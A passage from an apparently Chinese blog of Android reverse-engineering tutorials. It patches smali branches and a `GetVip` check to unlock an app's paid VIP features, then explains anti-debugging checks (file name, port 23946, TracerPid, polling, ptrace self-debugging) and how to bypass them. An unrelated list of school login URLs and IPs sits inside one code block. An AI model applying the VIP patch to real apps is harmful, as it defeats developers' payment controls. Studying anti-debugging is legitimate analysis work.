alt="image-20210731153500131"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210731172345.png" alt="image-20210731153532010"></p><p>只要和Vip相关 就离不开GetVip</p><p>进行分析：</p><p>达到这个switch中的<code>group.getCheckedRadioButtonId</code>这个条件</p><p>就会进行金木水火士判断执行</p><h3 id="Android-Killer进行查看smali代码-2"><a href="#Android-Killer进行查看smali代码-2" class="headerlink" title="Android Killer进行查看smali代码"></a>Android Killer进行查看smali代码</h3><p>根据Java代码中的package找到gsname文件夹</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210731172346.png" alt="image-20210731154056151"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210731172347.png" alt="image-20210731154205496"></p><p>找到</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210731172348.png" alt="image-20210731154334341"></p><p>可以看到下面有很多的<code>ChengYuListActivity$*.smali</code></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210731172349.png" alt="image-20210731154433020"></p><p>这是因为把dex反编译成<code>smali</code>时候会把所有的内部类、抽象类、接口类等全部都提取出来，用来单独存放</p><p>然后就能看到这么多的 Activity</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210731172350.png" alt="image-20210731154616981"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210731172351.png" alt="image-20210731154750992"></p><pre class="line-numbers language-none"><code class="language-none">解码："姓不能为空，请输入"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>并不是我们要修改的内容</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210731172352.png"></p><pre class="line-numbers language-none"><code class="language-none">VIP会员，可以选择五行。VIP会员升级请点击右下角会员专区<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210731172353.png" alt="image-20210731155044373"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210731172354.png" alt="image-20210731155120286"></p><p>我们可以看到结果是在内部类中</p><p>总共有两处</p><p>先点开第一处</p><p>我们进行分析</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210731172355.png" alt="image-20210731155313531"></p><p>看到了<code>setChecked(Z)V</code>传了个Z</p><p>Z就是fase进去，此时是跳转下来的</p><p>继续向上看到了<code>cond_0</code>这里是从这儿跳转下来的</p><p>那么往上看看<code>cond_0</code></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210731172356.png" alt="image-20210731155630458"></p><p>找到<code>cond_0</code></p><pre class="line-numbers language-none"><code class="language-none">if-eqz v1, :cond_0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>那么我们把这里一样的<code>if-eqz：等于0/if-nez：不等于0</code></p><p>修改为<code>if-nez</code> 就可以了</p><p>继续看第二处</p><p>第二处也是一样的</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210731172357.png" alt="image-20210731155943245"></p><p>向上跳转找<code>cond_0</code></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210731172358.png" alt="image-20210731160018243"></p><pre class="line-numbers language-none"><code class="language-none">if-eqz v1, :cond_0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>改成</p><pre class="line-numbers language-none"><code class="language-none">if-nez v1, :cond_0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210731172359.png" alt="image-20210731160112694"></p><p>保存修改</p><p>然后回编译</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210731172400.png" alt="image-20210731160253096"></p><p>进行尝试</p><p>还是不行</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210731172401.png" alt="image-20210731161059720"></p><p>换个方式</p><p>既然是要Vip 那么就去改GetVip的方法</p><p>搜索出来挺多结果的</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210731172402.png" alt="image-20210731161256604"></p><p>但是大部分都是调用的信息 我们要找的是定义的信息</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210731172403.png" alt="image-20210731161349247"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210731172404.png" alt="image-20210731161429895"></p><p>那么我们尝试注释掉这个</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210731172405.png" alt="image-20210731161736654"></p><p>保存之后 回编译 进行尝试</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210731172406.png" alt="image-20210731161835770"></p><p>进行尝试</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210731172407.png" alt="image-20210731161958532"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/20210731172408.png" alt="image-20210731162034615"></p><p>是成功的</p><p>OK！就到这里</p><p><strong>请注意：这里使用的技术仅用于学习知识目的，如果列出的技术用于其他任何目标，我概不负责。</strong></p>]]></content>
      
      
      <categories>
          
          <category> 安卓学习系列 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安卓学习(三) </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安卓学习(九)</title>
      <link href="/2021/10/28/an-zhuo-xue-xi-jiu/"/>
      <url>/2021/10/28/an-zhuo-xue-xi-jiu/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>反调试，在我们脱壳的第一步，虽然大佬们都能轻松过掉。。。</p><p>反调试虽然不能完全阻止攻击者，但是还是能加大攻击者的时间成本，一般与加壳结合使用，核心还是加壳部分</p><p>反调试可以分为两类：一类是检测，另一类是攻击</p><p>本文是对安卓逆向中的反调试进行案例分析</p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>IDA</p><p>AndroidKiller</p><p>jadx</p><p>一部安卓机</p><h2 id="一、文件检测"><a href="#一、文件检测" class="headerlink" title="一、文件检测"></a>一、文件检测</h2><p>反调试时，第一个会检测android_server，文件名检测<br>实战分析<code>filecheck</code>文件</p><h3 id="IDA-反编译"><a href="#IDA-反编译" class="headerlink" title="IDA 反编译"></a>IDA 反编译</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252990.png" alt="image-20211010201805446"></p><p><code>.so</code>文件是可以找到JNl_onload</p><p>它是编译可执行文件，逻辑在哪里呢</p><p>在Exports模块下 搜索<code>start</code> </p><p>找main函数的入口函数</p><p>双击进去</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252992.png" alt="image-20211010202121422"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252993.png" alt="image-20211010202317147"></p><p>如果这个函数的参数超过了四个以上(&gt;4)，跳转的地址就得用其他的寄存器来替代</p><p><code>libc_init</code>容纳的函数的参数是在四个以上(&gt;4)</p><p>当它这里没有被替代的时候，往下找最大的寄存器只出现了R*3为止，没出现R4以上的寄存器</p><p>那么这里猜测传入的个数的参数为︰是三个</p><p>具体验证一下</p><p>这里 TAB 进来</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252994.png" alt="image-20211010202915704"></p><p>可以看到 确实是三个参数</p><p>第三个参数是main函数</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252995.png" alt="image-20211010203005790"></p><p>双击 分析main函数</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252996.png" alt="image-20211010203119854"></p><p>这就是我们要找的main函数了</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252997.png" alt="image-20211010203347098"></p><p>或者 左边 直接双击main </p><p>也可以进入main函数</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252998.png" alt="image-20211010203526065"></p><p>进入main函数 之后 TAB 分析代码</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252999.png" alt="image-20211010203702535"></p><p>右键 进行隐藏类型</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252000.png" alt="image-20211010203740024"></p><p>下面是一个if判断</p><p>双击sub 进来 </p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252001.png" alt="image-20211010204218907"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252002.png" alt="image-20211010204322423"></p><p>分析代码</p><pre class="line-numbers language-none"><code class="language-none">v0 = opendir("/data/local/tmp");opendir打开/data/local/tmp目录给v0,它是一个文件指针result = getpid();getpid是当前进程的id简单讲，就是v0不等于0的时候，要执行while里面的循环逻辑v3 = readdir(v0);这里的v0就是打开的文件指针!strncmp(v5, "android_server", 0xEu)strncmp是一个字符串比较函数如果文件底层存在android_server,就会直接kill结束程序<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Android底层分析"><a href="#Android底层分析" class="headerlink" title="Android底层分析"></a>Android底层分析</h3><p>上我的安卓真机</p><p>adb上传filecheck</p><p>adb上传<code>android_server</code></p><pre class="line-numbers language-none"><code class="language-none">adb push C:\Users\12550\Desktop\filecheck data/local/tmpadb push C:\Users\12550\Desktop\android_server data/local/tmp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>加权</p><pre class="line-numbers language-none"><code class="language-none">chmod 777 android_serverchmod 777 filecheck<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252003.png" alt="image-20211014232222221"></p><p>执行</p><pre class="line-numbers language-none"><code class="language-none">./filecheck<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252004.png" alt="image-20211014232354162"></p><p>因为有<code>android_server</code>所以 被kill掉了</p><p>这就是一个文件反调试逻辑思路</p><h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><p>即我们改名字 即可</p><h2 id="二、端口检测"><a href="#二、端口检测" class="headerlink" title="二、端口检测"></a>二、端口检测</h2><h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p>这里给各位师傅 贴上源码</p><p>checkTCP.c</p><pre class="line-numbers language-none"><code class="language-none">#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;int num = 54321;//检测常用的端口void check(){    FILE* pfile=NULL;    char buf[0x1000]={0};    // 执行命令    char* strCatTcp= "cat /proc/net/tcp |grep :5D8A";    char* strNetstat="netstat |grep :23946";    pfile=popen(strCatTcp,"r");int pid=getpid();    if(NULL==pfile)    {        printf("打开命令失败!\n");        return;    }    // 获取结果    while(fgets(buf,sizeof(buf),pfile))    {        // 执行到这里，判定为调试状态        printf("执行cat /proc/net/tcp |grep :5D8A的结果:\n");        printf("%s",buf);int ret=kill(pid,SIGKILL);    }    pclose(pfile);}int main(){int x = 2;int y = 3;int key;x = x ^ y;y = x ^ y;x = x ^ y;int X = x ^ y;int Y = x &amp; y;Y= Y &lt;&lt; 1;int X0 = X ^ Y;int Y0 = X &amp; Y;Y0 = Y0 &lt;&lt; 1;if (Y0==0){key = X0+4543;}int encrypt = num ^ key;int decrypt = encrypt ^ key;check();printf("加密前：%d\n",num);printf("加密后值：%d\n",encrypt);printf("解密后值：%d\n", decrypt);    return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>源码分析</p><ul><li><p>首先FILE文件指针定义字符数组(char buf[0x1000]={0};)</p></li><li><p>然后执行命令<code>cat /proc/net/tcp |grep :5D8A</code></p><p>这里grep过滤端口只查看5D8A端口，5D8A换算是:23946</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252005.png" alt="image-20211012201008955"></p><p>android_server 默认的端口也是23946</p><p>缺图</p><p>如果有<code>5D8A</code>就<code>kill(pid,SIGKILL);</code></p></li></ul><h3 id="IDA反编译"><a href="#IDA反编译" class="headerlink" title="IDA反编译"></a>IDA反编译</h3><p>双击main函数</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252006.png" alt="image-20211012201546386"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252007.png" alt="image-20211012201956772"></p><p>空白处TAB进入伪C代码</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252008.png" alt="image-20211012202026178"></p><p>双击进入<code>check()</code>函数</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252009.png" alt="image-20211012202154440"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252010.png" alt="image-20211012202204772"></p><p>右键 进行隐藏类型 </p><p>然后 查看即可</p><h3 id="Android底层分析-1"><a href="#Android底层分析-1" class="headerlink" title="Android底层分析"></a>Android底层分析</h3><pre class="line-numbers language-none"><code class="language-none">adb push C:\Users\12550\Desktop\checkTCP data/local/tmpchmod 777 checkTCP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252011.png" alt="image-20211014232627607"></p><p>执行</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252013.png" alt="image-20211016122648923"></p><p>可以看到 是被kill掉了</p><h3 id="绕过-1"><a href="#绕过-1" class="headerlink" title="绕过"></a>绕过</h3><p>启动时 指定端口(<code>-p</code>)即可</p><h2 id="三、进程名称检测"><a href="#三、进程名称检测" class="headerlink" title="三、进程名称检测"></a>三、进程名称检测</h2><h3 id="源码分析-1"><a href="#源码分析-1" class="headerlink" title="源码分析"></a>源码分析</h3><pre class="line-numbers language-none"><code class="language-none">#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;//进程名称检测void coursecheck(){const int bufsize = 1024;    char filename[bufsize];    char line[bufsize];    char name[bufsize];    char nameline[bufsize];    int pid = getpid();    //先读取Tracepid的值    sprintf(filename, "/proc/%d/status", pid);    FILE *fd=fopen(filename,"r");    if(fd!=NULL){        while(fgets(line,bufsize,fd)){            if(strstr(line,"TracerPid")!=NULL)            {                int statue =atoi(&amp;line[10]);                if(statue!=0){                    sprintf(name,"/proc/%d/cmdline",statue);                    FILE *fdname=fopen(name,"r");                    if(fdname!= NULL){                        while(fgets(nameline,bufsize,fdname)){                            if(strstr(nameline,"android_server")!=NULL){                                int ret=kill(pid,SIGKILL);                            }                        }                    }                    fclose(fdname);                }            }        }    }    fclose(fd);}void order(int* p,int n)//n:表示数组的长度 {     int i,j;     int k;      for(i=0;i&lt;n-1;i++)     {       for(j=0;j&lt;n-1-i;j++)       {             if(*(p+j)&gt;*(p+j+1))             {                  k=*(p+j);//k=a;                   *(p+j)=*(p+j+1);//a=b;                  *(p+j+1)=k;  //b=k;                         }                     }                 }     printf("排序后的数组为:");     for(i=0;i&lt;n;i++)     {          if(i%5==0)              printf("\n");          printf("%4d",*(p+i));         }     printf("\n");}int main(){    int n;    printf("请输入数组元素的个数:");    scanf("%d",&amp;n);        int sum[n];    printf("请输入各个元素:");    int i;coursecheck();    for(i=0;i&lt;n;i++)    {        //scanf("%d",sum+i);        scanf("%d",&amp;sum[i]);      }    order(sum,n);//实现冒泡排序     return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>分析main函数</p><p>关注 这个方法</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252014.png" alt="image-20211011161410452"></p><p>获取(getpid)</p><p>pid值放到%d里面</p><p>然后以只读的方式(r)打开</p><p>进行获取当前进程的一个状态</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252015.png" alt="image-20211011161518870"></p><p>文件打开成功 就进入while循环</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252016.png" alt="image-20211011161715671"></p><h3 id="IDA反编译-1"><a href="#IDA反编译-1" class="headerlink" title="IDA反编译"></a>IDA反编译</h3><p>找到main函数 进来 </p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252017.png" alt="image-20211012202702845"></p><p>空白处TAB 查看伪C代码</p><p>关注这个方法</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252018.png" alt="image-20211012202650210"></p><p>右键 进行隐藏类型</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252019.png" alt="image-20211012203316052"></p><h3 id="Android底层分析-2"><a href="#Android底层分析-2" class="headerlink" title="Android底层分析"></a>Android底层分析</h3><pre class="line-numbers language-none"><code class="language-none">adb push C:\Users\12550\Desktop\BubbleSort data/local/tmp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252020.png" alt="image-20211014233114969"></p><p>运行程序</p><p>查看 进程列表</p><pre class="line-numbers language-none"><code class="language-none">ps | grep BubbleSort <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>程序的PID号：5760</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252021.png" alt="image-20211014233228865"></p><p>执行cat 遍历程序</p><pre class="line-numbers language-none"><code class="language-none">cat /proc/5760/status<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252022.png" alt="image-20211014233408549"></p><h3 id="IDA动态调试"><a href="#IDA动态调试" class="headerlink" title="IDA动态调试"></a>IDA动态调试</h3><pre class="line-numbers language-none"><code class="language-none">./a001 -p20365adb forward tcp:20365 tcp:3192<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252023.png" alt="image-20211012205252104"></p><p>增加设置</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252024.png" alt="image-20211012205630626"></p><h3 id="绕过-2"><a href="#绕过-2" class="headerlink" title="绕过"></a>绕过</h3><p>当我们在动态调试的时候</p><p>找到<code>Tracepid</code>赋值的地方，手动把它赋值改为0即可</p><pre class="line-numbers language-none"><code class="language-none">https://www.tadyz.com/http://112.245.48.30:8000/ameqp/ http://112.245.48.31:8989/TAYSSP/login/login_toIndex http://www.taez.com.cn/ http://www.sdtszx.com/ https://241918.yichafen.com/public/queryscore/sqcode/MsTcgnzmNzg2MnxiYTQ2Yjg5MThhMTU5ZjNlYjE5NGI1YTljMzlkMjA2M3wyNDE5MTgO0O0O.html http://sy.taschool.com/ http://www.tacczx.com/ http://www.tsbwzx.com/ http://www.tswgy.com/ http://www.tsxyfz.com.cn/ http://www.tsxyfz.com.cn/student/login.aspx http://www.tsxyfz.com.cn/teacher/login.aspx http://www.taschool.com/ http://yun.taschool.com/ http://class.taschool.com/login.php http://www.tasyzx.cn/ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="四、轮循检测"><a href="#四、轮循检测" class="headerlink" title="四、轮循检测"></a>四、轮循检测</h2><h3 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h3><pre class="line-numbers language-none"><code class="language-none">1.函数类型:safe_attach函数handle_events函数2.简介:轮询检测反调试技术基于循环检测进程的状态3.目的:判断当前进程是否正在被调试4.优点:实现比较简单5.缺点:系统资源消耗大6.原理:读取进程的/proc/[pid]/status文件，通过该文件得到调式当前进程的调式器(检测调式器的[pid])7.实现:通过status文件内的TracerPid字段的值判断当前进程或线程是否正在被调式8.status文件信息:Name:进程名称State:进程的状态Tgid:一般指进程的名称Pid:一般指进程Id，他的值与getting函数的返回值相等PPid:父进程的IdTraceerPid:实现调试功能的进程Id，值为0表示当前进程未被调试9.反-反调试方案:动态调试时修改TraceerPid字段值为0修改内核,让TraceerPid字段值为负值<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="源码分析-2"><a href="#源码分析-2" class="headerlink" title="源码分析"></a>源码分析</h3><p>这里 给师傅们 贴上源码</p><pre class="line-numbers language-none"><code class="language-none">#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;errno.h&gt;#include &lt;pthread.h&gt;#define TRACERPID "TracerPid:"#define TRACERPID_LEN (sizeof(TRACERPID) - 1)void loop(){    while(true)     {        sleep(60);    }}bool check_debugger(pid_t pid){    const int pathSize = 256;    const int bufSize = 1024;    char path[pathSize];    char line[bufSize];    snprintf(path, sizeof(path) - 1, "/proc/%d/status", pid);    bool result = true;    FILE *fp = fopen(path, "rt");    if (fp != NULL)     {           while (fgets(line, sizeof(line), fp))         {            if (strncmp(line, TRACERPID, TRACERPID_LEN) == 0)             {                pid_t tracerPid = 0;                 sscanf(line, "%*s%d", &amp;tracerPid);                if (!tracerPid) result = false;                                printf("%s", line);                break;            }        }        fclose(fp);    }    return result;}void *anti_debugger_thread(void *data){    pid_t pid = getpid();    while (true)    {        check_debugger(pid);        sleep(1);    }}void anti_debugger(){        pthread_t tid;    pthread_create(&amp;tid, NULL, &amp;anti_debugger_thread, NULL);}int main(){    printf("pid: %d\n", getpid());    anti_debugger();    loop();        return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从main函数 入手</p><p>main函数中调用了<code>anti_debugger()</code>函数</p><p><code>anti_debugger()</code>函数定义了<code>t tid</code>参数</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252025.png" alt="image-20211014224334016"></p><p><code>anti_debugger_thread</code>作为参数传入</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252026.png" alt="image-20211014224553203"></p><p>然后 继续往上看</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252027.png" alt="image-20211014224939134"></p><p>分析<code>check_debugger(pid);</code></p><pre class="line-numbers language-none"><code class="language-none">1.fopen:打开文件操作的意思2.path是上面传入path路径的2563.权限是以rt模式打开4.然后是一个if判断是否打开为空5.执行while循环，whie循环有fgets，打开指向的fp文件，会进行条件遍历6.if中根据传入的tracerPid进行strncmp比较7.如果传入的tracerPid为0就直接打印8.if (!tracerPid)不为0就返回false9.最后关闭文件指针<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252028.png" alt="image-20211014225143034"></p><h3 id="Andriod底层debugger调试"><a href="#Andriod底层debugger调试" class="headerlink" title="Andriod底层debugger调试"></a>Andriod底层debugger调试</h3><p>拿出我的安卓机</p><p>上传</p><pre class="line-numbers language-none"><code class="language-none">adb push C:\Users\12550\Desktop\poll_anti_debug data/local/tmpadb push C:\Users\12550\Desktop\debugger data/local/tmp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252029.png" alt="image-20211014230538572"></p><p>赋予权限</p><pre class="line-numbers language-none"><code class="language-none">chmod 777 debuggerchmod 777 poll_anti_debug<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252030.png" alt="image-20211014230626635"></p><p>运行检测调试程序<code>poll_anti_debug</code></p><p>可以看到在循环打印</p><pre class="line-numbers language-none"><code class="language-none">TracerPid: 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>并且<code>pid:5333</code></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252031.png" alt="image-20211014230832241"></p><p>debugger调试程序</p><pre class="line-numbers language-none"><code class="language-none">./debugger 5333<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252033.png" alt="image-20211014231021185"></p><h2 id="五、self-debugging反调试"><a href="#五、self-debugging反调试" class="headerlink" title="五、self-debugging反调试"></a>五、self-debugging反调试</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><pre class="line-numbers language-none"><code class="language-none">1.原理父进程创建一个子进程，通过子进程调试父进程2.特点非常实用、高效的实时反调式技术3.优点（可以作为受保护进程的主流反调试方案）消耗的系统资源比较少几乎不影响受保护进程性能可以轻易地阻止其他进程调式受保护的进程4.缺点实现比较复杂5.实现5.1 核心ptrace函数5.2进程的信号机制6.注意进程暂停状态比较多7.暂停状态7.1 signal-delivery-stop状态调试器和被调试进程之间的关系7.2 group-stop状态（难）sigcont信号同时满足两个条件：    进程/线程处于被调式状态    被调式进程/线程收到了暂停信号--&gt;重置为0 sigstop sigtstp sigttin sigttou7.3 sysco1l-stop状态7.4 ptrace-event-stop状态8.反-反调式8.1.让父进程不fork8.2.把 while函数循环去掉8.3.不能调试父进程，但可以调式子进程，配合双IDA调式，挂起子进程<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="fork函数"><a href="#fork函数" class="headerlink" title="fork函数"></a>fork函数</h3><pre class="line-numbers language-none"><code class="language-none">fork是一个函数fork函数fork出一个子进程来调试自己，那么别的函数就无法进行调试了那么通过调试fork出来的子进程从而调试父进程同一时刻，我们调试的时候，一个进程只能被一个进程附加<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252034.png" alt="image-20211015160113404"></p><h3 id="Android底层分析-3"><a href="#Android底层分析-3" class="headerlink" title="Android底层分析"></a>Android底层分析</h3><p>上传</p><pre class="line-numbers language-none"><code class="language-none">adb push C:\Users\12550\Desktop\debugger data/local/tmpadb push C:\Users\12550\Desktop\self-debugging data/local/tmp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>加权</p><pre class="line-numbers language-none"><code class="language-none">chmod 777 debuggerchmod 777 self-debugging<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252035.png" alt="image-20211015165005234"></p><p>找一个主进程进行调试</p><p>这里以找<code>.com</code>为例</p><pre class="line-numbers language-none"><code class="language-none">ps | grep .com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里以<code>nfc</code>进程进行调试</p><p>进程PID是：3294</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252036.png" alt="image-20211015165254570"></p><p>debugger调试</p><pre class="line-numbers language-none"><code class="language-none">./debugger 3*94<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252037.png" alt="image-20211015165553595"></p><p>查看nfc进程的<code>TracerPid</code></p><pre class="line-numbers language-none"><code class="language-none">cat /proc/3294/status<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252038.png" alt="image-20211015165818838"></p><p>我们在看看 这个TracerPid 具体对应哪个进程</p><pre class="line-numbers language-none"><code class="language-none">ps | grep 9624<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110161252039.png" 